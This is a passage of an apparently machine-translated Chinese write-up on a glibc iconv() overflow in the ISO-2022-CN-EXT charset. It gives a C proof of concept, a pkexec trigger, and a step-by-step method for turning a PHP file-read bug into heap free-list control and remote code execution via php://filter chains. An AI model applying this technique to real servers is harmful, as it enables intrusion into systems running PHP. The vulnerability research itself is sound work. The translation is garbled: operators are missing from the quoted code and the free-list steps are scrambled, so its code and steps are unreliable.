<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">// iconvdata/iso-2022-cn-ext.c/* See whether we have to emit an escape sequence.  */</span></em><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">if</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> (set != used){    </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">/* First see whether we announced that we use this        character set.  */</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">    </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">if</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8)) </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">// [1]</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">    {        </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">const</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> char *escseq;        </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">if</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> (outptr + 4  outend) </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">// &lt;-------------------- BOUND CHECK</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">        {            result = __GCONV_FULL_OUTPUT;            </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">break</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">;        }        assert(used = 1 &amp;&amp; used &lt;= 4);        escseq = &#34;)A</span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">\0\0</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">)G)E&#34; + (used - 1) * 2;        *outptr++ = ESC;        *outptr++ = &#39;$&#39;;        *outptr++ = *escseq++;        *outptr++ = *escseq++;        ann = (ann &amp; ~SO_ann) | (used &lt;&lt; 8);    }    </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">else</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">if</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8)) </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">// [2]</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">    {        </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">const</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> char *escseq;        </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">// &lt;-------------------- NO BOUND CHECK</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">        assert(used == CNS11643_2_set); </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">/* XXX */</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">        escseq = &#34;*H&#34;;        *outptr++ = ESC;        *outptr++ = &#39;$&#39;;        *outptr++ = *escseq++;        *outptr++ = *escseq++;        ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; 8);    }    </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">else</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">if</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8)) </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">// [3]</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">    {        </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">const</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> char *escseq;        </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">// &lt;-------------------- NO BOUND CHECK</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">        assert((used  5) = 3 &amp;&amp; (used  5) &lt;= 7);        escseq = &#34;+I+J+K+L+M&#34; + ((used  5) - 3) * 2;        *outptr++ = ESC;        *outptr++ = &#39;$&#39;;        *outptr++ = *escseq++;        *outptr++ = *escseq++;        ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; 8);    }}</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
为了触发该漏洞，我们需要iconv()  
在输出缓冲区结束之前强制发出转义序列。为此，我们可以使用奇异字符，例如：  
  
劄、䂚或。结果是 1   
到   
3   
个字节的溢出，具有以下值：峛湿  
  
•   
$*H  
[   
24 2A 48  
]  
  
•   
$+I  
[   
24 2B 49  
]  
  
•   
$+J  
[   
24 2B 4A  
]  
  
•   
$+K  
[   
24 2B 4B  
]  
  
•   
$+L  
[   
24 2B 4C  
]  
  
•   
$+M  
[   
24 2B 4D  
]  
  
一个简单的  
POC  
演示了这个错误：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">/*$ gcc -o poc ./poc.c &amp;&amp; ./poc*/</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">...void hexdump(void *ptr, int buflen){    ...}void main(){    iconv_t cd = iconv_open(&#34;ISO-2022-CN-EXT&#34;, &#34;UTF-8&#34;);    char input[0x10] = &#34;AAAAA劄&#34;;    char output[0x10] = {0};    char *pinput = input;    char *poutput = output;    </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">// Same size for input and output buffer: 8 bytes</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">    size_t sinput = strlen(input);    size_t soutput = sinput;    iconv(cd, &amp;pinput, &amp;sinput, &amp;poutput, &amp;soutput);    printf(&#34;Remaining bytes (should be &gt; 0): %zd</span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">\n</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">&#34;, soutput);    hexdump(output, 0x10);}</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
在易受攻击的系统上，这会产生：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">$ gcc -o poc ./poc.c &amp;&amp; ./poc</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">Remaining bytes (should be  0): -1</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">000000: 41 41 41 41  41 1b 24 2a  48 00 00 00  00 00 00 00    AAAA A.$* H... ....</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
iconv()  
尽管指示最多写入八个字节，但实际上已写入九个字节。  
  
检查  
提交历史  
，我发现这个错误已经存在很久了：它出现于 2000   
年，距今已有   
24   
年了。  
  
那么，该如何解决这个错误呢？  
  
**条件和原始**  
  
利用这个漏洞，我得到了 1   
到   
3   
个字节的溢出，其中包含非受控字符。这不算什么。除此之外，还有一些先决条件。我需要找到一个调用，  
iconv()  
在其中我：  
  
•   
控制输出字符集（  
ISO-2022-CN-EXT  
）  
  
•   
控制输入缓冲区的部分（用来输入漂亮的汉字）  
  
考虑到这一点，我开始寻找目标。从搜索  
iconv  
我的  
/lib  
和  
/bin  
目录到迭代数百个 OSS   
项目，我发现了一些有趣的目标。实际上没有一个是可以利用的。  
  
举例来说，让我们看一个非常有前景的目标：  
libxml2  
。  
  
**libxml2：字节的海洋**  
  
**libxml2**  
仅处理UTF-8 格式  
的 XML   
。如果   
XML   
文档不是UTF-8 格式  
，则会将其转换为 UTF-8   
格式，然后进行处理，处理完成后再转换回其原始字符集。转换使用 完成  
iconv()  
。  
  
因此，我们可以通过这样的文档来满足我们的先决条件：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-2022-CN-EXT&#34;?&gt;</span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">&lt;root&gt;&amp;21124;&lt;/root&gt;</span></strong><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
注：21124 是 劄 的 unicode 码点。  
  
现在，请记住：缓冲区管理是调用者的责任。当  
libxml2  
使用  
iconv()  
将文档转换回其原始字符集时，它会分配一个**输出缓冲区**  
，该缓冲区是**输入缓冲区**  
（代码  
）的**4 倍**  
。对我们来说太大了：我们无法达到缓冲区溢出的边界。死胡同。  
  
**pkexec：4 个字节太多**  
  
另一个有趣的目标是**pkexec**  
，这是许多 Linux   
发行版中都存在的   
setuid   
二进制文件。通过设置环境变量，该二进制文件允许您为其输出的每条消息选择字符集  
CHARSET  
。示例：  
  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">$ CHARSET=ISO-2022-CN-EXT pkexec &#39;trigger劄&#39; 2&amp;1 | hexyl</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">┌────────┬─────────────────────────┬─────────────────────────┬────────┬────────┐</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">│00000000│ 43 61 6e 6e 6f 74 20 72 ┊ 75 6e 20 70 72 6f 67 72 │Cannot r┊un progr│</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">│00000010│ 61 6d 20 74 72 69 67 67 ┊ 65 72 1b 24 2a 48 1b 4e │am trigg┊er•$*H•N│</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">│00000020│ 4c 61 0f 3a 20 4e 6f 20 ┊ 73 75 63 68 20 66 69 6c │La•: No ┊such fil│</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">│00000030│ 65 20 6f 72 20 64 69 72 ┊ 65 63 74 6f 72 79 0a    │e or dir┊ectory_ │</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">└────────┴─────────────────────────┴─────────────────────────┴────────┴────────┘</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
在内部，  
pkexec  
使用  
GLib  
输出其消息。它执行以下操作：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">#define NUL_TERMINATOR_LENGTH 4outbuf_size = len + NUL_TERMINATOR_LENGTH;outbytes_remaining = outbuf_size - NUL_TERMINATOR_LENGTH;outp = dest = g_malloc (outbuf_size);...err = g_iconv (converter, NULL, &amp;inbytes_remaining, &amp;outp, &amp;outbytes_remaining);</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
虽然它分配了一个N + 4 个  
字节的缓冲区，但它只告诉 iconv   
有关N 个  
字节的信息。我们的溢出最多只有 3   
个字节长。因此，无论我们多么努力，都无法到达缓冲区之外  
,  
又一条死路。  
  
**条件和原始（更新）**  
  
失望之余，我只能更新我的需求列表。要利用这个漏洞，我们需要：  
  
•   
控制输出字符集（  
ISO-2022-CN-EXT  
）  
  
•   
输入缓冲区的控制部分  
  
• **有合适的输出缓冲器**  
  
**利用 PHP 过滤器**  
  
经过几天的搜索，我还是没能找到一个有效的目标。我盲目地  
iconv()  
在库和二进制文件中搜索调用，浏览开源生态系统，寻找可触发的漏洞实例，我拼命寻找崩溃。一次。崩溃。毫无结果。  
  
为了重拾希望，我回到了 PHP  
：毕竟，它崩溃了  
，而这甚至是在我不经意间发生的。  
  
目标很简单：将无聊的文件读取漏洞转化为远程代码执行。  
  
**PHP 堆简介**  
  
注意：在本节以及描述 PHP 内部的每个部分中，我将进行近似并忽略某些内容。  
  
要了解这一切，我们需要了解 PHP   
堆的工作原理（至少是部分工作原理  
）。不用担心，这是一个非常简单的堆。  
  
要使用 PHP   
进行分配，请使用  
emalloc(N)  
，其中N  
为所需的字节数。您将获得一个指向至少可存储N 个  
字节的块（内存块）的指针。使用完块后，您可以使用   
释放它  
efree(ptr)  
。PHP   
具有各种大小的块（  
8  
、  
0x10  
、  
0x18  
、  
... 0x200  
、  
0x280  
、  
...  
）。  
  
PHP   
堆由   
2MB   
的区域组成，分为   
512   
个   
0x1000   
字节的页面。每个页面可能包含特定大小的块。例如，第   
10   
页可能包含大小为   
0x100   
的块，第   
11   
页可能包含大小为   
0x38   
的块，第   
12   
页可能包含大小为   
0x180   
的块，等等。  
块之间没有元数据。  
  
当您释放一个块时，它会被放在一个称为空闲列表的单链表的开头。每个块大小都有一个空闲列表。例如，如果我要释放一个大小为 0x38   
的块，它会进入大小为   
0x38   
的块的空闲列表。如果我释放一个大小为   
0x200   
的块，它会进入大小为   
0x200   
的块的空闲列表  
……  
  
要分配N 个  
字节，PHP   
会在空闲列表中查找相应的块大小，取出头部并返回。如果空闲列表为空（即  
所有可用块都已分配），PHP   
会在堆元数据中查找未使用的页面。然后在此类页面中创建空块，并将其放入空闲列表中。  
  
空闲列表是后进先出 (LIFO)   
的，也就是说，当我释放某个大小的块时，它将成为空闲列表的头部。当我分配时，头部被取出。这与   
glibc   
的   
tcache   
非常相似，但不受限制。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969xyaeSngibiajaialZQ6uY1CqFlceTf6VHibRL5NL014YEEaBxjsXWmcJ0g/640?wx_fmt=png&from=appmsg "")  
  
PHP 堆的可视化表示  
  
在上面的例子中，我们在左侧直观地表示了堆。它包含 512   
个页面，其中第5  
页存储大小为0x400  
的块。如果我们查看此页面的内容，我们可以看到它包含4 个  
块（因为4 × 0x400 = 0x1000  
，即页面大小）。这里，块 #1   
和   
#3   
被分配，而块   
#2   
和   
#4   
被释放。因此，它们位于大小为0x400  
的块的空闲列表中。  
  
空闲列表是一个单链表，每个未分配的块包含指向下一个空闲块的指针（作为其前 8   
个字节）。这就是我们在块   
#2   
中看到的：指向0x7ff10201400的指针，这是大小为0x400  
的下一个空闲块的地址。现在，如果我们要从块 #1**溢出**  
到块 #2  
，我们将覆盖此指针。这是漏洞利用的一个很好的起点：即使只有一个字节溢出，我们也可以更改空闲列表指针，从而  
更改空闲列表  
。  
  
需要注意的是，**PHP 会为每个 HTTP 请求创建一个新的堆**  
。这是远程 PHP   
攻击难以进行的原因之一，但第   
2   
部分将介绍这一点。  
  
**PHP 过滤器内部原理**  
  
现在我们知道了 PHP   
如何分配和释放，我们可以看看   
PHP   
如何处理字符串  
php://filter/  
。我们很幸运：我们不需要了解 PHP   
内部结构的细节，例如  
zval  
，，，  
zend_string  
等等  
zend_array  
。  
  
要处理过滤器，PHP   
首先会获取流（即  
读取资源）。它将流存储在桶集合中，桶是双向链接的结构，每个桶都包含一定大小的缓冲区。按照我们的  
/etc/passwd  
例子，我们可能有 3   
个桶：第一个桶可能包含文件的前   
5   
个字节，第二个桶包含   
30   
个字节，第三个桶包含   
1000   
个字节。它们链接在一起，构成一个桶队列  
。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969Zp1AECQAwZFUXfaWgO1xNUaZxe7jTUheib6eSNKmc3fB660ywrx5sxw/640?wx_fmt=png&from=appmsg "")  
  
一个由 3 个水桶组成的水桶队列，其中装有/etc/passwd  
  
这是将流表示为不同大小的缓冲区集合的标准方法。您可以将其想象为通过网络接收的数据包列表。数据包 1   
包含前   
N   
个字节的数据，数据包   
2   
包含接下来的   
M   
个字节，等等。  
  
现在 PHP   
已将资源的内容读入流中（由bucket brigade  
表示）   
，它可以对其应用过滤器。它采用第一个过滤器，并处理第一个 bucket  
。为此，它会分配一个与   
bucket   
缓冲区大小相同的输出缓冲区（在我们的示例中，该缓冲区为   
5   
个字节），然后进行转换。例如，如果过滤器是  
string.upper  
，它会将输入缓冲区中的每个小写字符转换为输出缓冲区中的大写字符。然后它可以创建一个指向此缓冲区的新 bucket  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969r2hicVic6mxQWp9NHMR4xdcvCicgduJnYQ58S75g4Ne7wgmx46G4VtsJg/640?wx_fmt=png&from=appmsg "")  
  
string.upper加入“水桶旅”申请  
  
然后它处理存储桶 2  
，然后是存储桶   
3  
，依此类推，直到到达最后一个存储桶。现在，它有了一个新的存储桶队列  
，每个输出存储桶都包含一个。现在它可以将第二个过滤器应用到这个队列上，并继续执行，直到最后一个过滤器被处理完毕。  
  
**现状与目标**  
  
我们已经完成了定义。让我们回到最初的漏洞：文件读取。  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">echo</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> file_get_contents($_GET[&#39;file&#39;]);</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
现在我们可以使用  
convert.iconv.XXX.ISO-2022-CN-EXT  
过滤器触发内存损坏，我们希望能够执行远程代码。而且这看起来并不难利用。  
  
首先，由于我们有一个文件读取原语，我们可以读取二进制文件（PHP  
、  
Apache   
等）。我们甚至可以下载   
libc   
并检查它是否已修补！我们也不关心   
ASLR   
和   
PIE  
：我们可以读取  
/proc/self/maps  
。最后，感觉我们几乎可以使用 buckets   
任意分配或释放缓冲区，这很方便。  
  
另一方面，在很多情况下，你都可以获得文件读取原语：你可能在运行 PHP 7.0   
的   
Symfony 4.x   
上获得它，或者在运行   
PHP 8.3   
的鲜为人知的   
Wordpress   
插件中获得它，甚至在黑盒评估期间。理想的  
漏洞利用需要具有弹性：它必须对大多数目标都有效，而无需任何调整。  
  
**开发**  
  
考虑到所有这些，让我们开始利用。我们的想法是使用单字节缓冲区溢出来修改指向空闲块的指针的 LSB  
，以便控制某个空闲列表。  
  
**单桶**  
  
我们面临的第一个问题是，尽管有 bucket brigade   
技术，但   
PHP   
只创建**一个**  
bucket  
。如果您读取一个文件，您将获得一个包含整个文件的   
bucket  
。如果您请求   
HTTP URL  
，  
PHP   
将创建一个包含整个   
HTTP   
响应的   
bucket  
。对于  
ftp://  
，也只有一个 bucket  
。这至少可以说非常不切实际  
：我们不能使用 bucket   
来填充堆、喷洒内容，甚至不能使用更改后的空闲列表。  
  
想想看：使用一个存储桶，我们可以溢出到一个空闲块并修改空闲列表，但是这样我们就没有存储桶了，而且我们至少需要再进行 2   
次分配才能使用我们修改后的空闲列表！  
  
幸运的是，一个过滤器拯救了我们：  
zlib.inflate  
。这个过滤器获取我们的流并对其进行解压缩。为此，它分配一个 8   
页（0x8000  
字节）的缓冲区并将我们的流填充到其中。如果它不够大，它会创建一个相同大小的新缓冲区来存储其余数据。如果这两个缓冲区仍然不够，它会创建另一个缓冲区。然后将每个缓冲区添加到一个存储桶中。完美：我们可以使用此过滤器创建任意数量的存储桶，这是一个很好的进步。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969spicTibasMLbfevVvcBa7xI2DVu9V1BnhZGibtzXgZkSzDpHVCl6Ffp5g/640?wx_fmt=png&from=appmsg "")  
  
申请zlib.inflate创建多个 bucket  
  
但是，这些存储桶的缓冲区大小为0x8000  
，这不利于利用；这些大小的缓冲区的分配方式与我所说的不同，并且在释放时不会进入空闲列表。我们需要调整存储桶的大小。  
  
**正确地去块化**  
  
为此，我们将使用 PHP   
中未记录但攻击者所熟知的过滤器：  
dechunk  
。此过滤器解码 HTTP   
分块编码的字符串。  
  
HTTP-chunked   
是一种非常简单的编码，您可以按块（不是堆  
块，而是数据  
块）发送数据。首先，您以 ASCII   
十六进制形式发送大小，然后是换行符，然后是相应大小的数据块，然后是换行符。然后您发送另一个大小、另一个块、另一个大小、另一个块，并通过发送大小0  
（零  
）来指示数据的结束。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC9696qY1uLZKxhBjficN0Opfibss6nCflvNibwxhdkaTS5KufoXHYJjpSTLaQ/640?wx_fmt=png&from=appmsg "")  
  
使用 HTTP 分块编码对数据进行编码  
  
   
  
示例中，第一个块长8  
字节，第二个块长17  
字节（11h  
），最后一个块长13  
dechunk  
字节。执行后结果为：  
This is how the chunked encoding works  
。  
  
使用此过滤器，调整存储桶大小听起来就像小孩子的游戏：在每个存储桶中，我们在数据前加上我们想要的大小（例如，第一个存储桶中加上0x148 ，第二个存储桶中加上 0x100  
，等等），然后放入数据，最后加上0  
表示我们已经完成。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC9696QINX9J6fKp0mwX8LAnJ41Ow8akAx2ZRF4sLcypBCheoUxXTvsWXrA/640?wx_fmt=png&from=appmsg "")  
  
设置存储桶dechunk  
  
   
  
看起来不错，但实际上行不通**。**  
虽然每个桶是分开处理的，但它们并不是**独立的**  
：它们都被解析为一个大流。当  
dechunk  
过滤器处理流时，它会读取第一个桶的大小0x148  
，取出 0x148   
字节，然后读取大小为零  
的桶，这会导致它停止解析。它不会转到第二个桶。它只是完全停止解析。我们操作的最终结果是我们从拥有多个桶（好）回到只有一个桶（坏）。  
  
幸运的是，找到一种规避这种情况的方法并不难：在每个 bucket   
中，我们提供一个大小和一个数据块。为此，我们不是简单地写一个大小，而是用数千个零填充它，以便得到如下结果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969eF2MY7fCjlKuiboqHJ7jCp4t9sBflZtRpDyYtic6EjfJ6Lqw7S3VRmeg/640?wx_fmt=png&from=appmsg "")  
  
正确设置存储桶dechunk  
  
现在，在处理完存储桶 1   
后，去块解析器会跳转到存储桶   
2  
，准备读取新的大小，然后跳转到存储桶   
3  
，依此类推。成功了！现在我们可以根据需要创建任意**数量的存储桶，大小**  
也由我们决定。我们取得了巨大的进步。  
  
**空闲列表控制：写入什么位置**  
  
现在，我们的目标是通过用值48h  
（  
H  
ASCII   
码）覆盖某个指针的   
LSB   
来更改某个空闲列表。为了无条件地获得相同的效果，我们将大小为0x100  
的块作为目标，因为块地址的 LSB   
始终为零。这意味着溢出的效果始终相同：**将 0x48 添加到块指针**  
。  
  
为了利用该漏洞，我们遵循一个非常标准的 6   
步程序。我们将空闲列表命名为大小为   
0x100   
的块  
FL[0x100]  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969ic5Csibcf6ApgB5v9Y4S4GS5OOC6dWL8XVPUOnDp7SkecpSofkkFKFgw/640?wx_fmt=png&from=appmsg "")  
  
控制 FL[0x100]  
  
假设我们已经通过分配大量0x100  
块来填充堆。因此，在内存中的某处，我们有了三个连续的空闲块  
A  
、  
B  
和  
C  
，其中  
A  
是   
的头  
FL[100]  
。  
A  
指向  
B  
，而   
又指向  
C  
。我们可以分配这 3   
个（步骤   
2  
），然后再次释放它们（步骤   
3  
）。此时，空闲列表反转：我们有  
C  
→   
B  
→   
A  
。然后我们再次分配，但这次我们在   
的  
0x1122334455  
偏移量处放置一个任意指针（步骤 4  
）。我们再次释放它们（步骤   
5  
），并获得与步骤   
1   
完全相同的状态，但这次略有不同：在 处，我们有一个任意指针。现在我们可以从块 执行溢出，从而移动 中包含的指针。它现在指向，因此空闲列表现在是  
→ →   
。通过再进行   
3   
次分配，我们可以让   
PHP   
在我们的任意地址进行分配。  
48hCC+48hABC+48hBC+48h0x1122334455  
  
我们现在有了**“写什么在哪里”的信息**  
；这几乎结束了。  
  
但是让我回到漏洞利用的实现。在这里描述的各个步骤中，我们分配了块，然后释放了块。但我们无法真正摆脱存储桶：我们只能改变它们的大小。但是，我们只**对大小为 0x100 的块感兴趣**  
。就好像其他块不存在一样。因此，我将每个存储桶构建为**HTTP 分块的俄罗斯套娃**  
：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969P3WutWh0yIiaQDmfKOdAwfQuiaom5XhWpSOCxnLziaStwrIMXpbibKfibibg/640?wx_fmt=png&from=appmsg "")  
  
对于漏洞利用的每个步骤，  
dechunk  
都会调用过滤器：每个存储桶的大小都会发生变化。有些存储桶的大小变为 0x100  
，因此在漏洞利用中  
“  
出现  
”  
，而有些存储桶变小，因此消失。它为我们提供了一种完美的方法，可以让存储桶在特定时刻实现，并在我们不再需要它们时将其丢弃。  
  
解决了这个问题之后，我们就可以执行代码了。  
  
**代码执行**  
  
虽然我们通过读取可以看到内存区域  
/proc/self/maps  
，但我们并不清楚  
自己在堆中的确切位置。幸运的是，我们可以通过定位 PHP   
